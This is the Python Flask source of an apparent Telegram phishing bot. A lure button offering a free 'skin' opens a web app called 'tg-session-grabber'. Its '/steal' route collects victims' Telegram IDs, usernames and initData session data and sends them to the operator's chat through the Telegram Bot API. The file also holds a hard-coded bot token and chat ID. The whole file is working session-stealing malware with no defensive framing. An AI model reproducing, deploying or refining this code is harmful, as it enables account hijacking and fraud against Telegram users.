from flask import Flask, request, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "7854566294:AAGyNSrEwNeZ9SNEFR2HZKNaYkv3ZhIoTXk"
CHAT_ID = "5388340518"
WEBAPP_URL = "https://tg-session-grabber.onrender.com"

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/steal', methods=['POST'])
def steal():
    data = request.get_json()
    print(f"[{datetime.now()}] Received: {data}")
    
    if data:
        msg = f"🔥 **ЖЕРТВА** 🔥\n{datetime.now().strftime('%H:%M:%S')}\n"
        
        if data.get('user'):
            u = data['user']
            msg += f"ID: {u.get('id')}\n"
            if u.get('username'):
                msg += f"@{u.get('username')}\n"
        
        if data.get('initData'):
            msg += f"\n`{data['initData'][:150]}`"
        
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg[:500], 'parse_mode': 'Markdown'})
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error'}), 400

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'message' in data:
        chat_id = data['message']['chat']['id']
        keyboard = {"inline_keyboard": [[{"text": "🎁 Забрать скин", "web_app": {"url": WEBAPP_URL}}]]}
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        payload = {'chat_id': chat_id, 'text': "Нажми на кнопку", 'reply_markup': json.dumps(keyboard)}
        requests.post(url, json=payload)
    return jsonify({'ok': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
